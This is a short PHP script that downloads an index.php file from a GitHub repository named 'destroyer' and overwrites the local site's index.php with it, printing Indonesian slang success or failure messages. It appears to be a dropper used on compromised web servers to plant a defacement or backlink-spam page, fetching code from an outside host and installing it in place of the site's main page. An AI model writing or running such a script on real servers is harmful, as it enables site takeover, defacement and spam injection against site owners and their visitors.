<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/destroyer/main/index.php';
$localFilePath = __DIR__ . '/index.php';
$content = file_get_contents($url);
if ($content !== false) {
    $result = file_put_contents($localFilePath, $content);
    if ($result !== false) {
        echo "Nahh Done Kaik...\n";
    } else {
        echo "Waduh gagal kaik...\n";
    }
} else {
    echo "Waduh gagal kaik...\n";
}
?>
